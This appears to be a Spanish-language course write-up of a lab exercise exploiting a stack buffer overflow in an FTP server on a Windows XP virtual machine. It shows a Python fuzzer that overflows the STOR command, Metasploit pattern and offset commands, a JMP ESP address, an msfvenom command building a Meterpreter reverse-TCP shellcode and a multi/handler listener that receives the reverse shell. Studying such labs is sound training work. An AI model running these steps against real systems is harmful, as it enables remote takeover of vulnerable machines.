---
title: Fuzzing & Debbuging
published: true
layout: post
author: Sergio Salgado
---
# [](#header-1)Maquina Timelapse

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#desarrollo">Desarrollo</a>
  - <a href="#Especificaciones_del_laboratorio">Especificaciones del laboratorio</a>
  - <a href="#fuzzing">Fuzzing</a>
  - <a href="#payload_creation">Gain Access</a>
  - <a href="#payload_handler">Escalamiento de privilegios</a>
  - <a href="#payload_handler">Escalamiento de privilegios</a>
  - <a href="#payload_handler">Escalamiento de privilegios</a>

## [](#header-2)<a id="introduccion">Introduccion</a>
Las aplicaciones sin pruebas de seguridad tienden a tener vulnerabilidades en su código, podría
estar haciendo llamadas a módulos o librerías inseguras. En este entregable se pondrá en práctica lo
aprendido en el curso de Seguridad para aplicaciones móviles, y se utilizara una aplicación desde la
página exploit-db con vulnerabilidad para fuzzing y buffer-overflow.
Cuando existen estas vulnerabilidades prácticamente uno puede tomar control total del dispositivo
que está ejecutando el programa.
El entorno donde trabajaremos es virtual, el dispositivo tiene una arquitectura x86 y un sistema
operativo Windows XP.

## [](#header-2)<a id="desarrollo">Desarrollo</a>
### [](#header-3)<a id="Especificaciones_del_laboratorio">Especificaciones del laboratorio</a>
Se utilizará una máquina virtual con sistema operativo Windows XP de 32 bits y una maquina Kali Linux enlazadas por red y permitiendo el tráfico de datos entre estas.

Para el análisis del software utilizado en la maquina Windows xp, se utilizará la aplicación immunity debbuger, que es un desensamblador de programas y con esto podemos estar monitoreando la ejecución del sistema

-Immunity debugger

![Debbuging Tools](/assets/images/fuzzing&debbuging/debbug_tools.png)

-Programa a utilizar FTPserver, obtenida del link https://www.exploit-db.com/exploits/46763

### [](#header-3)<a id="fuzzing">Fuzzing</a>
El siguiente programa escrito en python, tiene bloques importantes, el que define los caracteres o cadena con la que se hará el testing, el que realiza el envió de la información.

La cadena en este caso será una A multiplicada por 10mil, al ser ejecutado mandará al servidor FTP una cadena de 10mil bytes despues de pasar el usuario y contraseña.

```py
#!/usr/bin/python2

import socket

cadena = 'A' * 10000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexion = s.connect(('192.168.100.252',21))
s.recv(1024)
s.send('USER ftp\r\n') #USUARIO
s.recv(1024)
s.send('PASS ftp\r\n') #PASS
s.recv(1024)
s.send('STOR' + cadena + '\r\n')
s.recv(1024)
s.send ('QUIT\r\n')
s.close()
```

Al ejecutar este programa, podemos verificar que se están almacenando As en la memoria de la máquina, cuando son demasiadas podremos interrumpir el programa y prácticamente hacer un ataque de denegación del servicio, pero aquí no queda todo, se puede seguir estudiando el programa para seguir ahora con un ataque de buffer overflow. 

![Fuzzing Test 1](/assets/images/fuzzing&debbuging/fuzzing_1.png)

En la imagen se aprecia que estamos escribiendo en la memoria de propósito general ESP, utilizando solamente mil bytes para la prueba y con esto podemos proceder al buffer overflow.

### [](#header-3)<a id="fuzzing">Buffer overflow</a>
¿Como funciona un buffer overflow? En este articulo se menciona algo importante que es la arquitectura de las computadoras o el tipo de procesador que tienen estas, al ser diferentes las computadoras, la ejecución de un programa tiene llamadas diferentes a las librerías del mismo procesador, entonces para ejecutar un programa con éxito se deberá conocer a detalle la arquitectura especifica de esta. Recientemente apple saco su computadora que contiene un procesador que esta desarrollado por ellos y es mas complicado el explotar sus vulnerabilidades, al ser un dispositivo que no esta al alcance de muchas personas pues no existen personas dedicadas o enfocadas a beneficiarse por este medio.

![Apuntadores de proposito general](/assets/images/fuzzing&debbuging/apuntadores.png)

Una vez conociendo el punto aproximado del desbordamiento, empezaremos a tener el control del programa, mandando la cadena del codigo anterior con el siguiente patrón, y asi podremos determinar en qué punto o con que cantidad exacta de bytes deja de funcionar el programa.

```S
msf-pattern_create --l 3500         #para crear el patrón

msf-pattern_offset -q 0012FED0        #para hacer la consulta del patrón
```

```py
#!/usr/bin/python2

import socket

cadena = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexion = s.connect(('192.168.100.252',21))
s.recv(1024)
s.send('USER ftp\r\n') #USUARIO
s.recv(1024)
s.send('PASS ftp\r\n') #PASS
s.recv(1024)
s.send('STOR' + cadena + '\r\n')
s.recv(1024)
s.send ('QUIT\r\n')
s.close()
```
Teniendo en cuenta los apuntadores principales, con el código anterior determinaremos la cantidad exacta en la que el programa es interrumpido y empezar a notar en que segmentos del programa escribe en los apuntadores de propósito general.

Para despues hacer un llamado a funciones del sistema que nos permitan establecer una conexión remota con otra computadora.

Para el siguiente análisis, utilizaremos una cadena de mil bytes, para que el programa nos indique en que lugar de memoria empezamos a escribir.

![Desbordamiento de buffer](/assets/images/fuzzing&debbuging/debug1.png)

Obtenemos los caracteres i6Ai para el ESP, y con estos podemos empezar la consulta, también tenemos los yZAy para el EDI

![Consulta Offset](/assets/images/fuzzing&debbuging/debug1.png)

A continuación, con el programa en pausa, buscamos las librerías o dll de interés, dando click en la e minúscula de la barra superior, pondremos atención en el modulo ejecutable que se llama USER32, este modulo tiene muchas funciones, entre ellos para hacer pruebas podemos abrir un messagebox, para notificarnos que tenemos acceso o simplemente la ejecución de algún programa que desarrollemos.

![dll usadas](/assets/images/fuzzing&debbuging/dll_used.png)

Ahora que dimos doble click en el modulo ejecutable de USER32, podemos buscar la dirección de memoria en donde se ejecuta el jmp_esp, ya que cada computadora lo puede ejecutar en diferente dirección dependiendo su arquitectura y por eso es necesario especificar esto para fines generales. En este caso lo tendremos en la dirección 7E429353, este dato es importante para hacer la llamada de esta función en la interrupción del programa. En el siguiente paso se describirá en que parte es necesario y como deberá ser su implementación.

![Uso de ESP](/assets/images/fuzzing&debbuging/esp_usage.png)

### [](#header-3)<a id="payload_creation">Creación de payload y programa de inserción </a>
En Metasploit tenemos los exploits y los payloads. Un exploit es una vulnerabilidad, y el payload es la carga que se ejecuta en esa vulnerabilidad, es decir, la carga que activamos a la hora de aprovechar dicha vulnerabilidad.

El comando para generar el programa o payload en shellcode que utilizaremos para establecer la conexión desde el dispositivo víctima es msfvenom, que es una extensión de la herramienta msfconsole,  LHOST es para asignar la IP de la máquina que esperara la conexión y estará en escucha de la misma en un puerto, con LPORT, -a es para asignarle, en seguida de -p se escoge el payload a utilizar, en seguida del -e se especifica la codificación a utilizar; en este caso texto Alpha numerico, después de -f es para el formato de salida; en este caso se utilizara python, -b indicara caracteres que queremos que se excluyan en el código, en este caso son caracteres que podrían interrumpir el código en algún punto.

```S
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.100.117 LPORT=4444 -e x86/alpha_mixed -f python -b ‘\x00\x0A\x0D’
```
La salida del commando será:

![Payload win x86](/assets/images/fuzzing&debbuging/payload_win.png)

Al codigo ahora le adaptaremos los datos que ya tenemos, el shellcode imprimirá 20 veces un carácter y se sumara con lo que tenemos en buffer, que será el payload que hemos creado anteriormente. Las variales ESP y EIP ya han sido declaradas, sus valores son 259 y 749, con esto la operación que realizara entre la escritura en memoria es que, al terminar un desbordamiento, empezaremos a escribir libremente el código que hemos generado para establecer la conexión con nuestra propia maquina

![Calculo de buffer overflow](/assets/images/fuzzing&debbuging/calculo_buffer_overflow.png)

### [](#header-3)<a id="payload_handler">Payload Handler</a>

En este paso, mandaremos a la computadora victima el programa que necesitamos ejecutar para recibir una conexión desde ese dispositivo sin alarmar al antivirus y siendo el dispositivo el que nos lo envie.

El primer paso es abrir el puerto en la maquina Kali Linux para esperar la conexión desde la maquina víctima.

En la terminal ejecutaremos

```S
msfconsole
```

Después el siguiente comando especificara que usaremos un payload que fue creado en metasploit

```S
use multi/handler
```

Especificamos el payload que cargamos para establecer la comunicación

```S
set PAYLOAD windows/meterpreter/reverse_tcp
```

Especificamos la IP 0.0.0.0 para esperar todas las conexiones, donde la prioridad se dirige ahora en el puerto

```S
set LHOST 0.0.0.0
```

Este puerto se estableció también en el payload y deberá ser el mismo que se uso ahí.

```S
set LPORT 4444
```

Con este último comando, iniciamos el exploit.

```S
exploit
```

![msfconsole setting parameters](/assets/images/fuzzing&debbuging/msfconsole_setting_parameters.png)


Después se ejecutará el programa que manda el payload haciendo el buffer overflow. Y ejecuta un reverse Shell hacia nuestra computadora Kali.

Prueba de la ejecución del comando de screenshot en la maquina Windows XP.
![Prueba de reverse shell](/assets/images/fuzzing&debbuging/last_test.png)